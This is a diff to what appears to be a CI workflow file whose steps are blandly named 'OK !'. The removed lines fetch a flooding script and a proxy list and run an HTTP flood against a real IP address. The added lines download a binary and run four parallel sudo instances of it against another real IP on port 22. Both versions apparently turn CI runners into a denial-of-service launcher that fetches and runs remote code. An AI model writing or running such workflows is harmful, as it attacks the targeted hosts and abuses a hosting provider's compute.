@@ -15,12 +15,19 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
-          wget https://up.zip/v1nnk/proxies.txt
-          npm i hpack
-          timeout 40 node tornado.js GET http://185.72.9.141:5985/ 40 10 64 proxies.txt --full --query 3
+          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
+          chmod +x tekpoyraz
+          PIDS=()
+          for i in {1..4}; do
+            sudo timeout 25 ./tekpoyraz 216.202.200.164 22 &
+            PIDS+=($!)
+          done
           
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
       - name: OK !
         run: |
-          sleep 40
+          sleep 25
           exit 0
